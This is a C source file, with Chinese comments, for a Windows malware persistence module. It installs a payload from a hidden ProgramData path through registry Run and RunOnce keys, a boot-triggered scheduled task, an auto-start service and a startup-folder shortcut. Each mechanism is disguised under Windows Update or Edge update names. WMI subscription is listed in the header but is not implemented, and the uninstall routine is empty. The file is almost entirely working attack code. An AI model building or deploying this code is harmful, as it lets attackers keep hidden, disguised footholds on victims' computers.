/*
 * Windows Persistence Module
 *
 * 实现多种持久化机制：
 * 1. 注册表 Run 键
 * 2. 计划任务
 * 3. 服务注册
 * 4. WMI 事件订阅
 * 5. 启动文件夹快捷方式
 *
 * 编译: x86_64-w64-mingw32-gcc -O2 -Wall -s -Wl,--subsystem,windows \
 *        -lole32 -loleaut32 -luuid -ladvapi32 -lshell32 -lws2_32 \
 *        windows_persist.c -o persistence.exe
 */

#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <shlwapi.h>
#include <taskschd.h>
#include <comdef.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

#define PAYLOAD_PATH L"C:\\ProgramData\\Microsoft\\Crypto\\cache.dat"
#define SERVICE_NAME L"WindowsUpdateService"
#define TASK_NAME L"MicrosoftEdgeUpdateTask"

/*
 * 方法1: 注册表 Run 键
 * 在多个 Run 位置写入启动项
 */
int InstallRegistryRun() {
    HKEY hKey;
    const wchar_t* runPaths[] = {
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    };
    int count = 0;

    for (int i = 0; i < 2; i++) {
        if (RegOpenKeyExW(HKEY_CURRENT_USER, runPaths[i], 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ,
                               (const BYTE*)PAYLOAD_PATH,
                               (wcslen(PAYLOAD_PATH) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
                count++;
            }
            RegCloseKey(hKey);
        }

        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, runPaths[i], 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ,
                               (const BYTE*)PAYLOAD_PATH,
                               (wcslen(PAYLOAD_PATH) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
                count++;
            }
            RegCloseKey(hKey);
        }
    }

    return count;
}

/*
 * 方法2: 计划任务
 * 使用 Task Scheduler 2.0 API
 */
int InstallScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 0;

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
                             RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                             RPC_C_IMP_LEVEL_IMPERSONATE,
                             NULL, 0, NULL);
    // CO_E_SSD_FAILEXEC may occur if already initialized, ignore

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        CoUninitialize();
        return 0;
    }

    VARIANT var;
    VariantInit(&var);
    var.vt = VT_NULL;

    hr = pService->Connect(var, var, var, var);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return 0;
    }

    // 创建任务定义
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return 0;
    }

    // 设置执行动作
    IActionCollection* pActions = NULL;
    hr = pTask->get_Actions(&pActions);
    if (SUCCEEDED(hr)) {
        IAction* pAction = NULL;
        hr = pActions->Create(TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            IExecAction* pExecAction = NULL;
            hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                pExecAction->put_Path((BSTR)PAYLOAD_PATH);
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActions->Release();
    }

    // 设置触发器（系统启动时）
    ITriggerCollection* pTriggers = NULL;
    hr = pTask->get_Triggers(&pTriggers);
    if (SUCCEEDED(hr)) {
        ITrigger* pTrigger = NULL;
        hr = pTriggers->Create(TASK_TRIGGER_BOOT, &pTrigger);
        if (SUCCEEDED(hr)) {
            pTrigger->Release();
        }
        pTriggers->Release();
    }

    // 注册任务
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pService->RegisterTaskDefinition(
        TASK_NAME, pTask, TASK_CREATE_OR_UPDATE,
        _variant_t(L""), _variant_t(L""),
        TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L""),
        &pRegisteredTask
    );

    int result = SUCCEEDED(hr) ? 1 : 0;

    if (pRegisteredTask) pRegisteredTask->Release();
    pTask->Release();
    pService->Release();
    CoUninitialize();

    return result;
}

/*
 * 方法3: 服务注册
 * 将 payload 注册为系统服务
 */
int InstallService() {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return 0;

    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        SERVICE_NAME,
        L"Windows Update Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        PAYLOAD_PATH,
        NULL, NULL, NULL, NULL, NULL
    );

    int result = 0;
    if (hService) {
        result = 1;
        CloseServiceHandle(hService);
    }

    CloseServiceHandle(hSCManager);
    return result;
}

/*
 * 方法4: 启动文件夹快捷方式
 */
int InstallStartupShortcut() {
    wchar_t startupPath[MAX_PATH];
    HRESULT hr = SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    if (FAILED(hr)) return 0;

    wchar_t shortcutPath[MAX_PATH];
    wsprintfW(shortcutPath, L"%s\\WindowsUpdate.lnk", startupPath);

    IShellLinkW* pShellLink = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                          IID_IShellLinkW, (void**)&pShellLink);
    if (FAILED(hr)) return 0;

    pShellLink->SetPath(PAYLOAD_PATH);
    pShellLink->SetDescription(L"Windows Update Service");

    IPersistFile* pPersistFile = NULL;
    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
    if (SUCCEEDED(hr)) {
        hr = pPersistFile->Save(shortcutPath, TRUE);
        pPersistFile->Release();
    }

    pShellLink->Release();
    return SUCCEEDED(hr) ? 1 : 0;
}

/*
 * 主安装函数
 * 尝试所有方法，返回成功数量
 */
int InstallAll() {
    int success = 0;

    printf("=== Installing Persistence ===\n\n");

    printf("[*] Installing Registry Run keys...\n");
    int reg = InstallRegistryRun();
    printf("    [+] %d registry entries installed\n", reg);
    success += reg;

    printf("[*] Installing Scheduled Task...\n");
    int task = InstallScheduledTask();
    if (task) printf("    [+] Scheduled task created\n");
    success += task;

    printf("[*] Installing Service...\n");
    int svc = InstallService();
    if (svc) printf("    [+] Service registered\n");
    success += svc;

    printf("[*] Installing Startup Shortcut...\n");
    int lnk = InstallStartupShortcut();
    if (lnk) printf("    [+] Shortcut created\n");
    success += lnk;

    printf("\n[+] Total persistence mechanisms: %d\n", success);
    return success;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc > 1 && wcscmp(argv[1], L"--uninstall") == 0) {
        printf("=== Uninstalling Persistence ===\n");
        // 实现卸载逻辑
        return 0;
    }

    return InstallAll();
}
